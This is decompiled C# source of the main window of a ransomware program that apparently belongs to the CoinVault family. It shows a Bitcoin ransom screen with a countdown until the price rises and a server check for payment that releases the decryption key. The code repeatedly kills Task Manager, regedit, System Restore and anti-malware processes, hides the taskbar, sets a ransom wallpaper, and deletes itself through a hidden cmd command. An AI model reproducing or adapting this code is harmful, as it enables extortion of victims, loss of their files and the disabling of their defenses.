using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Locker.Properties;
using Microsoft.Win32;

namespace Locker;

public class frmMain : Form
{
	private delegate void Delegate1();

	private delegate void Delegate2(Label textbox, string value);

	private delegate void Delegate3(NameValueCollection status, bool showMessage);

	private delegate void Delegate4(int value);

	private const int int_0 = 273;

	private const int int_1 = 419;

	private const int int_2 = 20;

	private const int int_3 = 1;

	private const int int_4 = 2;

	private BackgroundWorker backgroundWorker_0;

	private System.Timers.Timer timer_0;

	private System.Timers.Timer timer_1;

	private BackgroundWorker backgroundWorker_1;

	private TimeSpan timeSpan_0;

	private string[] string_0;

	private bool bool_0;

	private bool bool_1;

	private IContainer icontainer_0;

	private RichTextBox txtMaintext;

	private PictureBox pbLogo;

	private Label lblTimetext;

	private TextBox txtBitcoinAddress;

	private Label lblBitcoinaddress;

	private Button btnCopyBitcoinAddress;

	private Button btnDecrypt;

	private Button btnOpenFilelist;

	private TextBox txtKey;

	private TextBox txtIv;

	private Label lblKey;

	private Label lblIv;

	private Button btnCheck;

	private Label lblTime;

	private TextBox txtCosts;

	private TextBox txtPaid;

	private Label lblBtc;

	private Label lblBtc2;

	private Timer timer_2;

	private Label lblLastCheck;

	private ProgressBar pbDecrypt;

	private Label lblCostText;

	private Label lblCosts;

	private Label label1;

	private Label lblPaid;

	private Button btnHowto;

	private GroupBox groupBox1;

	private GroupBox groupBox2;

	private Button btnGetFreeDecrypt;

	public frmMain()
	{
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_017f: Expected O, but got Unknown
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Expected O, but got Unknown
		((Control)this).Hide();
		InitializeComponent();
		backgroundWorker_0 = new BackgroundWorker();
		backgroundWorker_0.WorkerSupportsCancellation = true;
		backgroundWorker_0.DoWork += backgroundWorker_0_DoWork;
		backgroundWorker_0.RunWorkerCompleted += backgroundWorker_0_RunWorkerCompleted;
		backgroundWorker_0.RunWorkerAsync();
		if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
		{
			((Control)btnCheck).set_Text("Controleer betaling en ontvang sleutels");
			((Control)btnCopyBitcoinAddress).set_Text("Kopieër");
			((Control)btnDecrypt).set_Text("Ontgrendel bestanden met sleutels");
			((Control)btnGetFreeDecrypt).set_Text("Één gratis ontgrendeling");
			((Control)btnHowto).set_Text("Betaalinstructies");
			((Control)btnOpenFilelist).set_Text("Geef versleutelde bestandenlijst weer");
			((Control)label1).set_Text("Betaald:");
			((Control)lblBitcoinaddress).set_Text("Verstuur bitcoins naar dit bitcoinadres:");
			((Control)lblCosts).set_Text("Laden");
			((Control)lblCostText).set_Text("Totale kosten:");
			((Control)lblPaid).set_Text("Laden");
			((Control)lblTime).set_Text("Laden...");
			((Control)lblTimetext).set_Text("Resterende tijd tot kostenverhoging:");
			((Control)btnCheck).set_Font(new Font(FontFamily.get_GenericSansSerif(), 9f));
			((Control)btnGetFreeDecrypt).set_Font(new Font(FontFamily.get_GenericSansSerif(), 8.25f));
			((Control)lblTimetext).set_Font(new Font(FontFamily.get_GenericSansSerif(), 9.75f, (FontStyle)1));
		}
	}

	private void backgroundWorker_0_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		if (e.Error != null)
		{
			((Form)this).Close();
		}
		else if (e.Cancelled)
		{
			((Form)this).Close();
		}
		else if ((bool)e.Result && Class3.Class3_0.Int32_0 > 0)
		{
			backgroundWorker_1 = new BackgroundWorker();
			backgroundWorker_1.RunWorkerCompleted += backgroundWorker_1_RunWorkerCompleted;
			backgroundWorker_1.DoWork += backgroundWorker_1_DoWork;
			string text = Class7.smethod_10();
			string_0 = text.Split(new string[1] { "--page--" }, StringSplitOptions.None);
			timer_0 = new System.Timers.Timer();
			timer_0.Interval = 120000.0;
			timer_0.Elapsed += timer_0_Elapsed;
			timer_1 = new System.Timers.Timer();
			timer_1.Interval = 500.0;
			timer_1.Elapsed += timer_1_Elapsed;
			method_4(false);
			timer_2.set_Enabled(true);
			timer_0.Enabled = true;
			((Control)txtMaintext).set_Text(string_0[0]);
			timer_1.Enabled = true;
			method_3(bool_2: false);
			method_2();
			new Thread(method_0).Start();
			((Control)this).Show();
			bool_1 = true;
		}
		else
		{
			((Form)this).Close();
		}
	}

	private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
	{
		BackgroundWorker backgroundWorker = sender as BackgroundWorker;
		Class7.smethod_0();
		NameValueCollection nameValueCollection = Class7.smethod_1();
		if (nameValueCollection.Count == 0)
		{
			e.Result = false;
		}
		else
		{
			if (backgroundWorker.CancellationPending)
			{
				return;
			}
			Class3.Class3_0.method_0();
			if (backgroundWorker.CancellationPending)
			{
				return;
			}
			if (nameValueCollection["status"] == "unlocked")
			{
				Class5 @class = Class7.smethod_6();
				if (@class == null)
				{
					@class = new Class5(Class6.smethod_0(32), Class6.smethod_0(32));
					e.Result = false;
					for (int i = 0; i < 10; i++)
					{
						if (!Class7.smethod_7(@class))
						{
							Thread.Sleep(2000);
							continue;
						}
						e.Result = true;
						break;
					}
					if (!(bool)e.Result)
					{
						return;
					}
				}
				Class3.Class3_0.method_5(backgroundWorker);
				if (backgroundWorker.CancellationPending)
				{
					return;
				}
				e.Result = false;
				for (int j = 0; j < 10; j++)
				{
					if (!Class7.smethod_9())
					{
						Thread.Sleep(2000);
						continue;
					}
					e.Result = true;
					break;
				}
				if (!(bool)e.Result)
				{
					return;
				}
				Class7.smethod_8();
			}
			e.Result = true;
		}
	}

	private void method_0()
	{
		Thread.Sleep(1000);
		btnOpenFilelist_Click(null, null);
		Thread.Sleep(500);
		method_1();
	}

	private void method_1()
	{
		if (((Control)this).get_InvokeRequired())
		{
			Delegate1 @delegate = method_1;
			((Control)this).Invoke((Delegate)@delegate);
		}
		else
		{
			((Form)this).set_WindowState((FormWindowState)1);
			((Control)this).Show();
			((Form)this).set_WindowState((FormWindowState)0);
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_1, string string_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, int int_5, IntPtr intptr_1, IntPtr intptr_2);

	private void method_2()
	{
		IntPtr intptr_ = FindWindow("Shell_TrayWnd", null);
		SendMessage(intptr_, 273, (IntPtr)419, IntPtr.Zero);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int int_5, int int_6, string string_1, int int_7);

	public void method_3(bool bool_2)
	{
		try
		{
			string text = Path.Combine(Path.GetTempPath(), "wallpaper.jpg");
			Class7.smethod_12(bool_2 ? "tmps2.dat" : "tmps.dat", text);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			registryKey.SetValue("WallpaperStyle", 2.ToString());
			registryKey.SetValue("TileWallpaper", 0.ToString());
			SystemParametersInfo(20, 0, text, 3);
		}
		catch (Exception)
		{
		}
	}

	private void timer_1_Elapsed(object sender, ElapsedEventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.ToLower().Contains("cmd") || process.ProcessName.ToLower().Contains("processhacker") || process.ProcessName.ToLower().Contains("mbam") || process.ProcessName.ToLower().Contains("sh4") || process.ProcessName.ToLower().Contains("spyhunter") || process.ProcessName.ToLower().Contains("msconfig") || process.ProcessName.ToLower().Contains("taskmgr") || process.ProcessName.ToLower().Contains("roguekiller") || process.ProcessName.ToLower().Contains("rstrui") || process.ProcessName.ToLower().Contains("regedit") || process.ProcessName.ToLower().Contains("procexp"))
			{
				try
				{
					process.Kill();
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private void timer_0_Elapsed(object sender, ElapsedEventArgs e)
	{
		method_4(false);
	}

	private void method_4(object object_0)
	{
		method_5(lblLastCheck, "Checking...");
		method_6(Class7.smethod_1(), (bool)object_0);
	}

	private void method_5(Label label_0, string string_1)
	{
		if (((Control)label_0).get_InvokeRequired())
		{
			Delegate2 @delegate = method_5;
			((Control)this).Invoke((Delegate)@delegate, new object[2] { label_0, string_1 });
		}
		else
		{
			((Control)label_0).set_Text(string_1);
		}
	}

	private void method_6(NameValueCollection nameValueCollection_0, bool bool_2)
	{
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)txtCosts).get_InvokeRequired())
		{
			Delegate3 @delegate = method_6;
			((Control)this).Invoke((Delegate)@delegate, new object[2] { nameValueCollection_0, bool_2 });
			return;
		}
		if (nameValueCollection_0.Count == 0)
		{
			((Control)lblTime).set_Text("Server down");
			return;
		}
		((Control)txtCosts).set_Text(nameValueCollection_0["costs"]);
		((Control)txtPaid).set_Text(nameValueCollection_0["balance"]);
		float num = Class7.smethod_5();
		CultureInfo cultureInfo = CultureInfo.CreateSpecificCulture("nl-NL");
		((Control)lblCosts).set_Text((Class7.smethod_2() * num).ToString("C", cultureInfo));
		((Control)lblPaid).set_Text((Class7.smethod_3() * num).ToString("C", cultureInfo));
		((Control)txtBitcoinAddress).set_Text(nameValueCollection_0["address"]);
		if (Class7.smethod_6() != null)
		{
			((Control)btnDecrypt).set_Enabled(true);
			timer_2.set_Enabled(false);
			timer_1.Enabled = false;
			((Control)lblTime).set_Text("Thank you!");
			((Control)txtKey).set_Text(Class7.smethod_6().String_0);
			((Control)txtIv).set_Text(Class7.smethod_6().String_1);
			method_2();
		}
		else
		{
			string s = nameValueCollection_0["time"];
			int result = 0;
			int.TryParse(s, out result);
			timeSpan_0 = TimeSpan.FromSeconds(result);
			if (bool_2)
			{
				if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
				{
					MessageBox.Show("Nog geen betaling ontvangen of bevestigd.", "Betaling gecontroleerd", (MessageBoxButtons)0, (MessageBoxIcon)64);
				}
				else
				{
					MessageBox.Show("No payments received or confirmed yet.", "Payments checked", (MessageBoxButtons)0, (MessageBoxIcon)64);
				}
			}
		}
		((Control)lblLastCheck).set_Text("Last check: " + DateTime.Now);
	}

	private void btnOpenFilelist_Click(object sender, EventArgs e)
	{
		try
		{
			StreamReader streamReader = new StreamReader(Class3.Class3_0.string_0);
			StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "CoinVaultFileList.txt"), append: false);
			string text;
			while ((text = streamReader.ReadLine()) != null)
			{
				string[] array = text.Split(new char[1] { '|' });
				if (array.Length == 2 && !(array[1] != "True"))
				{
					streamWriter.WriteLine(array[0]);
				}
			}
			streamWriter.Close();
			streamReader.Close();
		}
		catch (Exception)
		{
		}
		Process.Start("notepad.exe", Path.Combine(Path.GetTempPath(), "CoinVaultFileList.txt"));
	}

	private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!bool_1)
		{
			if (backgroundWorker_0 != null)
			{
				backgroundWorker_0.CancelAsync();
			}
			Class3.Class3_0.Dispose();
			((CancelEventArgs)(object)e).Cancel = false;
		}
		else if (!bool_0)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		if (timeSpan_0.TotalSeconds < 1.0)
		{
			if (((Control)txtCosts).get_Text() != "")
			{
				method_4(false);
			}
			return;
		}
		timeSpan_0 = timeSpan_0.Subtract(new TimeSpan(0, 0, 1));
		((Control)lblTime).set_Text(timeSpan_0.Hours.ToString("00") + ":" + timeSpan_0.Minutes.ToString("00") + ":" + timeSpan_0.Seconds.ToString("00"));
	}

	private void btnCopyBitcoinAddress_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)txtBitcoinAddress).get_Text());
	}

	private void btnCheck_Click(object sender, EventArgs e)
	{
		Thread thread = new Thread(method_4);
		thread.Start(true);
	}

	private void btnDecrypt_Click(object sender, EventArgs e)
	{
		if (Class7.smethod_6() != null && !backgroundWorker_1.IsBusy)
		{
			((Control)btnDecrypt).set_Enabled(false);
			((Control)btnCheck).set_Enabled(false);
			((Control)btnHowto).set_Enabled(false);
			if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
			{
				((Control)txtMaintext).set_Text("Uw bestanden worden ontgrendeld, laat de computer alstublieft aanstaan.\r\nDit kan enkele minuten tot enkele uren duren, dit verschilt per computer.");
			}
			else
			{
				((Control)txtMaintext).set_Text("Decryption in progress, this can take several minutes to serveral hours depending on your computer speed.");
			}
			((Control)pbDecrypt).set_Visible(true);
			backgroundWorker_1.RunWorkerAsync();
		}
	}

	private void backgroundWorker_1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		((Control)pbDecrypt).set_Visible(false);
		pbDecrypt.set_Value(0);
		MessageBox.Show("Files restored! Program will destroy itself.", "Files restored", (MessageBoxButtons)0, (MessageBoxIcon)64);
		bool_0 = true;
		new Thread(method_7).Start();
		((Control)this).Hide();
	}

	public void method_7()
	{
		Class6.smethod_3();
		try
		{
			File.Delete(Class3.Class3_0.string_0);
		}
		catch (Exception)
		{
		}
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.Arguments = "/c PING -n 11 127.0.0.1>nul & del \"" + Assembly.GetEntryAssembly()!.Location + "\"";
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		Application.Exit();
	}

	private void backgroundWorker_1_DoWork(object sender, DoWorkEventArgs e)
	{
		Class3.Class3_0.method_6(this);
		method_3(bool_2: true);
	}

	public void method_8(int int_5, int int_6)
	{
		method_9((int)((double)int_5 / (double)int_6 * 100.0));
	}

	private void method_9(int int_5)
	{
		if (((Control)pbDecrypt).get_InvokeRequired())
		{
			Delegate4 @delegate = method_9;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { int_5 });
		}
		else
		{
			pbDecrypt.set_Value(int_5);
		}
	}

	private void btnHowto_Click(object sender, EventArgs e)
	{
		if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
		{
			if (((Control)btnHowto).get_Text().ToLower().Contains("betaal"))
			{
				((Control)btnHowto).set_Text("Geef informatie weer");
				((Control)txtMaintext).set_Text(string_0[1]);
			}
			else
			{
				((Control)btnHowto).set_Text("Betaalinstructies");
				((Control)txtMaintext).set_Text(string_0[0]);
			}
		}
		else if (((Control)btnHowto).get_Text().Contains("pay"))
		{
			((Control)btnHowto).set_Text("Show information");
			((Control)txtMaintext).set_Text(string_0[1]);
		}
		else
		{
			((Control)btnHowto).set_Text("How to pay");
			((Control)txtMaintext).set_Text(string_0[0]);
		}
	}

	private void btnGetFreeDecrypt_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new frmGetFreeDecrypt()).ShowDialog();
	}

	private void frmMain_Shown(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0b0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b15: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		txtMaintext = new RichTextBox();
		lblTimetext = new Label();
		txtBitcoinAddress = new TextBox();
		lblBitcoinaddress = new Label();
		btnCopyBitcoinAddress = new Button();
		btnDecrypt = new Button();
		btnOpenFilelist = new Button();
		txtKey = new TextBox();
		txtIv = new TextBox();
		lblKey = new Label();
		lblIv = new Label();
		btnCheck = new Button();
		lblTime = new Label();
		txtCosts = new TextBox();
		txtPaid = new TextBox();
		lblBtc = new Label();
		lblBtc2 = new Label();
		timer_2 = new Timer(icontainer_0);
		lblLastCheck = new Label();
		pbDecrypt = new ProgressBar();
		lblCostText = new Label();
		lblCosts = new Label();
		label1 = new Label();
		lblPaid = new Label();
		btnHowto = new Button();
		groupBox1 = new GroupBox();
		groupBox2 = new GroupBox();
		btnGetFreeDecrypt = new Button();
		pbLogo = new PictureBox();
		((Control)groupBox1).SuspendLayout();
		((Control)groupBox2).SuspendLayout();
		((ISupportInitialize)pbLogo).BeginInit();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(txtMaintext, "txtMaintext");
		((Control)txtMaintext).set_ForeColor(SystemColors.MenuText);
		((Control)txtMaintext).set_Name("txtMaintext");
		((TextBoxBase)txtMaintext).set_ReadOnly(true);
		((Control)lblTimetext).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblTimetext, "lblTimetext");
		((Control)lblTimetext).set_ForeColor(Color.Black);
		((Control)lblTimetext).set_Name("lblTimetext");
		componentResourceManager.ApplyResources(txtBitcoinAddress, "txtBitcoinAddress");
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		componentResourceManager.ApplyResources(lblBitcoinaddress, "lblBitcoinaddress");
		((Control)lblBitcoinaddress).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblBitcoinaddress).set_Name("lblBitcoinaddress");
		((Control)btnCopyBitcoinAddress).set_ForeColor(SystemColors.ActiveCaptionText);
		componentResourceManager.ApplyResources(btnCopyBitcoinAddress, "btnCopyBitcoinAddress");
		((Control)btnCopyBitcoinAddress).set_Name("btnCopyBitcoinAddress");
		((ButtonBase)btnCopyBitcoinAddress).set_UseVisualStyleBackColor(true);
		((Control)btnCopyBitcoinAddress).add_Click((EventHandler)btnCopyBitcoinAddress_Click);
		componentResourceManager.ApplyResources(btnDecrypt, "btnDecrypt");
		((Control)btnDecrypt).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnDecrypt).set_Name("btnDecrypt");
		((ButtonBase)btnDecrypt).set_UseVisualStyleBackColor(true);
		((Control)btnDecrypt).add_Click((EventHandler)btnDecrypt_Click);
		componentResourceManager.ApplyResources(btnOpenFilelist, "btnOpenFilelist");
		((Control)btnOpenFilelist).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnOpenFilelist).set_Name("btnOpenFilelist");
		((ButtonBase)btnOpenFilelist).set_UseVisualStyleBackColor(true);
		((Control)btnOpenFilelist).add_Click((EventHandler)btnOpenFilelist_Click);
		componentResourceManager.ApplyResources(txtKey, "txtKey");
		((Control)txtKey).set_Name("txtKey");
		((TextBoxBase)txtKey).set_ReadOnly(true);
		componentResourceManager.ApplyResources(txtIv, "txtIv");
		((Control)txtIv).set_Name("txtIv");
		((TextBoxBase)txtIv).set_ReadOnly(true);
		((Control)lblKey).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblKey, "lblKey");
		((Control)lblKey).set_ForeColor(Color.Black);
		((Control)lblKey).set_Name("lblKey");
		((Control)lblIv).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblIv, "lblIv");
		((Control)lblIv).set_ForeColor(Color.Black);
		((Control)lblIv).set_Name("lblIv");
		componentResourceManager.ApplyResources(btnCheck, "btnCheck");
		((Control)btnCheck).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnCheck).set_Name("btnCheck");
		((ButtonBase)btnCheck).set_UseVisualStyleBackColor(true);
		((Control)btnCheck).add_Click((EventHandler)btnCheck_Click);
		((Control)lblTime).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblTime, "lblTime");
		((Control)lblTime).set_ForeColor(Color.Goldenrod);
		((Control)lblTime).set_Name("lblTime");
		((Control)txtCosts).set_Cursor(Cursors.get_IBeam());
		componentResourceManager.ApplyResources(txtCosts, "txtCosts");
		((Control)txtCosts).set_Name("txtCosts");
		((TextBoxBase)txtCosts).set_ReadOnly(true);
		componentResourceManager.ApplyResources(txtPaid, "txtPaid");
		((Control)txtPaid).set_Name("txtPaid");
		((TextBoxBase)txtPaid).set_ReadOnly(true);
		((Control)lblBtc).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblBtc, "lblBtc");
		((Control)lblBtc).set_ForeColor(Color.Goldenrod);
		((Control)lblBtc).set_Name("lblBtc");
		((Control)lblBtc2).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblBtc2, "lblBtc2");
		((Control)lblBtc2).set_ForeColor(Color.Goldenrod);
		((Control)lblBtc2).set_Name("lblBtc2");
		timer_2.set_Interval(1000);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		((Control)lblLastCheck).set_ForeColor(Color.Lime);
		componentResourceManager.ApplyResources(lblLastCheck, "lblLastCheck");
		((Control)lblLastCheck).set_Name("lblLastCheck");
		componentResourceManager.ApplyResources(pbDecrypt, "pbDecrypt");
		((Control)pbDecrypt).set_Name("pbDecrypt");
		((Control)lblCostText).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblCostText, "lblCostText");
		((Control)lblCostText).set_ForeColor(Color.Black);
		((Control)lblCostText).set_Name("lblCostText");
		((Control)lblCosts).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblCosts, "lblCosts");
		((Control)lblCosts).set_ForeColor(Color.Goldenrod);
		((Control)lblCosts).set_Name("lblCosts");
		((Control)label1).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(label1, "label1");
		((Control)label1).set_ForeColor(Color.Black);
		((Control)label1).set_Name("label1");
		((Control)lblPaid).set_BackColor(Color.Transparent);
		componentResourceManager.ApplyResources(lblPaid, "lblPaid");
		((Control)lblPaid).set_ForeColor(Color.Goldenrod);
		((Control)lblPaid).set_Name("lblPaid");
		componentResourceManager.ApplyResources(btnHowto, "btnHowto");
		((Control)btnHowto).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnHowto).set_Name("btnHowto");
		((ButtonBase)btnHowto).set_UseVisualStyleBackColor(true);
		((Control)btnHowto).add_Click((EventHandler)btnHowto_Click);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblCostText);
		((Control)groupBox1).get_Controls().Add((Control)(object)txtCosts);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblPaid);
		((Control)groupBox1).get_Controls().Add((Control)(object)txtPaid);
		((Control)groupBox1).get_Controls().Add((Control)(object)label1);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblBtc);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblCosts);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblBtc2);
		componentResourceManager.ApplyResources(groupBox1, "groupBox1");
		((Control)groupBox1).set_Name("groupBox1");
		groupBox1.set_TabStop(false);
		((Control)groupBox2).get_Controls().Add((Control)(object)btnCheck);
		((Control)groupBox2).get_Controls().Add((Control)(object)btnDecrypt);
		((Control)groupBox2).get_Controls().Add((Control)(object)txtKey);
		((Control)groupBox2).get_Controls().Add((Control)(object)txtIv);
		((Control)groupBox2).get_Controls().Add((Control)(object)lblKey);
		((Control)groupBox2).get_Controls().Add((Control)(object)lblIv);
		componentResourceManager.ApplyResources(groupBox2, "groupBox2");
		((Control)groupBox2).set_Name("groupBox2");
		groupBox2.set_TabStop(false);
		componentResourceManager.ApplyResources(btnGetFreeDecrypt, "btnGetFreeDecrypt");
		((Control)btnGetFreeDecrypt).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnGetFreeDecrypt).set_Name("btnGetFreeDecrypt");
		((ButtonBase)btnGetFreeDecrypt).set_UseVisualStyleBackColor(true);
		((Control)btnGetFreeDecrypt).add_Click((EventHandler)btnGetFreeDecrypt_Click);
		((Control)pbLogo).set_BackColor(Color.Transparent);
		((Control)pbLogo).set_Cursor(Cursors.get_Default());
		componentResourceManager.ApplyResources(pbLogo, "pbLogo");
		pbLogo.set_Image((Image)(object)Resources.Bitmap_0);
		((Control)pbLogo).set_Name("pbLogo");
		pbLogo.set_TabStop(false);
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Control)this).get_Controls().Add((Control)(object)btnGetFreeDecrypt);
		((Control)this).get_Controls().Add((Control)(object)btnHowto);
		((Control)this).get_Controls().Add((Control)(object)pbDecrypt);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)lblLastCheck);
		((Control)this).get_Controls().Add((Control)(object)lblTime);
		((Control)this).get_Controls().Add((Control)(object)btnOpenFilelist);
		((Control)this).get_Controls().Add((Control)(object)btnCopyBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinaddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)lblTimetext);
		((Control)this).get_Controls().Add((Control)(object)pbLogo);
		((Control)this).get_Controls().Add((Control)(object)txtMaintext);
		((Control)this).set_ForeColor(Color.Transparent);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
		((Form)this).add_Shown((EventHandler)frmMain_Shown);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox2).PerformLayout();
		((ISupportInitialize)pbLogo).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
